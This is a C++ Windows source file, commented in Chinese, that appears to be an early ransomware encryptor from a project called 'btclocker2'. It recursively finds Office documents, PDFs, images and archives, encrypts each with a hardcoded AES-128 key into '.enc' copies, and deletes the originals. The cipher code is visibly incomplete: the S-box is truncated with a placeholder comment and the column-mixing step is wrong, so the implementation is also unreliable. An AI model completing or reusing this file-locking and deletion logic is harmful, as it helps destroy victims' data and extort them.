#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <Windows.h>
#include <string.h>
#include <string>

#define Nb 4            // AES 数据块列数
#define Nk 4            // AES 密钥扩展的字数（对于 AES-128，Nk = 4）
#define Nr 10           // AES-128 使用 10 轮

// AES 密钥（固定）
const uint8_t fixedKey[4 * Nk] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x97, 0x75, 0x46, 0x64, 0x2c, 0x7b
};

// S-box
static const uint8_t SBox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf0, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0x77, 0x63, 0x69, 0x90, 0x76, 0x62, 0x2f, 0x0f,
    // Add remaining S-box values...
};

// 轮常量
static const uint8_t Rcon[10] = {
    0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36
};

// AES 加密操作函数声明
void keyExpansion(const uint8_t* key, uint32_t* roundKeys);
void addRoundKey(uint8_t* state, const uint32_t* roundKey);
void subBytes(uint8_t* state);
void shiftRows(uint8_t* state);
void mixColumns(uint8_t* state);
void aesEncrypt(const uint8_t plaintext[4 * Nb], uint8_t ciphertext[4 * Nb], const uint8_t key[4 * Nk]);

// 密钥扩展
void keyExpansion(const uint8_t* key, uint32_t* roundKeys) {
    uint32_t temp;
    int i = 0;

    while (i < Nk) {
        roundKeys[i] = ((uint32_t)key[4 * i] << 24) |
            ((uint32_t)key[4 * i + 1] << 16) |
            ((uint32_t)key[4 * i + 2] << 8) |
            ((uint32_t)key[4 * i + 3]);
        i++;
    }

    i = Nk;
    while (i < Nb * (Nr + 1)) {
        temp = roundKeys[i - 1];
        if (i % Nk == 0) {
            temp = (SBox[(temp >> 16) & 0xFF] << 24) |
                (SBox[(temp >> 8) & 0xFF] << 16) |
                (SBox[temp & 0xFF] << 8) |
                (SBox[(temp >> 24) & 0xFF]);
            temp ^= Rcon[i / Nk - 1] << 24;
        }
        roundKeys[i] = roundKeys[i - Nk] ^ temp;
        i++;
    }
}

// 字节替换
void subBytes(uint8_t* state) {
    for (int i = 0; i < 4 * Nb; i++) {
        state[i] = SBox[state[i]];
    }
}

// 行移位
void shiftRows(uint8_t* state) {
    uint8_t temp;

    // 第二行循环左移 1 位
    temp = state[1];
    state[1] = state[5];
    state[5] = state[9];
    state[9] = state[13];
    state[13] = temp;

    // 第三行循环左移 2 位
    temp = state[2];
    state[2] = state[10];
    state[10] = temp;
    temp = state[6];
    state[6] = state[14];
    state[14] = temp;

    // 第四行循环左移 3 位
    temp = state[3];
    state[3] = state[15];
    state[15] = state[11];
    state[11] = state[7];
    state[7] = temp;
}

// 列混合
void mixColumns(uint8_t* state) {
    uint8_t temp[4];

    for (int i = 0; i < 4; i++) {
        temp[0] = state[i];
        temp[1] = state[i + 4];
        temp[2] = state[i + 8];
        temp[3] = state[i + 12];

        state[i] = (uint8_t)(temp[0] ^ temp[1] ^ temp[2] ^ temp[3]);
        state[i + 4] = (uint8_t)(temp[0] ^ temp[1]);
        state[i + 8] = (uint8_t)(temp[1] ^ temp[2]);
        state[i + 12] = (uint8_t)(temp[2] ^ temp[3]);
    }
}

// 密钥加
void addRoundKey(uint8_t* state, const uint32_t* roundKey) {
    for (int i = 0; i < Nb; i++) {
        for (int j = 0; j < 4; j++) {
            state[i * 4 + j] ^= (roundKey[i] >> ((3 - j) * 8)) & 0xFF;
        }
    }
}

// AES 加密
void aesEncrypt(const uint8_t plaintext[4 * Nb], uint8_t ciphertext[4 * Nb], const uint8_t key[4 * Nk]) {
    uint8_t state[4 * Nb];
    uint32_t w[Nb * (Nr + 1)];  // 修改为 uint32_t 类型

    // 复制明文到状态数组
    for (int i = 0; i < 4 * Nb; i++) {
        state[i] = plaintext[i];
    }

    // 密钥扩展
    keyExpansion(key, w);

    // 初始轮密钥加
    addRoundKey(state, w);

    // 前 9 轮加密
    for (int round = 1; round < Nr; round++) {
        subBytes(state);
        shiftRows(state);
        mixColumns(state);
        addRoundKey(state, w + round * Nb);
    }

    // 最后一轮加密（没有列混淆）
    subBytes(state);
    shiftRows(state);
    addRoundKey(state, w + Nr * Nb);

    // 将最终状态复制到密文数组
    for (int i = 0; i < 4 * Nb; i++) {
        ciphertext[i] = state[i];
    }
}

// 加密文件
void encryptFile(const std::string& inputFilePath, const std::string& outputFilePath, const uint8_t key[4 * Nk]) {
    std::ifstream inFile(inputFilePath, std::ios::binary);
    if (!inFile) {
        std::cerr << "无法打开输入文件: " << inputFilePath << std::endl;
        return;
    }

    std::ofstream outFile(outputFilePath, std::ios::binary);
    if (!outFile) {
        std::cerr << "无法打开输出文件: " << outputFilePath << std::endl;
        return;
    }

    std::vector<uint8_t> buffer(4 * Nb);
    while (inFile.read(reinterpret_cast<char*>(buffer.data()), 4 * Nb)) {
        uint8_t ciphertext[4 * Nb];
        aesEncrypt(buffer.data(), ciphertext, key);
        outFile.write(reinterpret_cast<char*>(ciphertext), 4 * Nb);
    }

    // 处理剩余不足一个块的数据，这里简单填充 0
    std::streamsize remaining = inFile.gcount();
    if (remaining > 0) {
        for (std::streamsize i = remaining; i < 4 * Nb; ++i) {
            buffer[i] = 0;
        }
        uint8_t ciphertext[4 * Nb];
        aesEncrypt(buffer.data(), ciphertext, key);
        outFile.write(reinterpret_cast<char*>(ciphertext), 4 * Nb);
    }

    inFile.close();
    outFile.close();

    // 删除原文件
    if (DeleteFileA(inputFilePath.c_str())) {
        std::cout << "已删除原文件: " << inputFilePath << std::endl;
    }
    else {
        std::cerr << "无法删除原文件: " << inputFilePath << std::endl;
    }
}

// 遍历目录并加密文件
void traverseDirectory(const std::string& directoryPath, const std::vector<std::string>& extensions, const uint8_t key[4 * Nk]) {
    std::string searchPath = directoryPath + "\\*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    std::string subDirectory = directoryPath + "\\" + findData.cFileName;
                    traverseDirectory(subDirectory, extensions, key);
                }
            }
            else {
                std::string fileName = findData.cFileName;
                size_t dotPos = fileName.find_last_of('.');
                if (dotPos != std::string::npos) {
                    std::string ext = fileName.substr(dotPos);
                    for (const auto& targetExt : extensions) {
                        if (ext == targetExt) {
                            std::string inputFilePath = directoryPath + "\\" + fileName;
                            std::string outputFilePath = inputFilePath + ".enc";
                            encryptFile(inputFilePath, outputFilePath, key);
                            break;
                        }
                    }
                }
            }
        } while (FindNextFileA(hFind, &findData) != 0);
        FindClose(hFind);
    }
}

// 遍历并加密指定目录下的文件
void traverseAndEncrypt(const std::string& directoryPath, const std::vector<std::string>& extensions, const uint8_t key[4 * Nk]) {
    traverseDirectory(directoryPath, extensions, key);
}

// 主加密函数
void encrypt() {
    SetConsoleOutputCP(CP_UTF8);  // 设置控制台输出为 UTF-8 编码

    std::string directoryPath = "C:\\Users\\胡剑卓\\source\\repos\\btclocker2";
    std::vector<std::string> extensions = { ".ppt", ".doc", ".docx", ".pdf", ".xls", ".pptx", ".jpg", ".png", ".zip", ".7z", ".rar", ".xlsx" };

    traverseAndEncrypt(directoryPath, extensions, fixedKey);
}

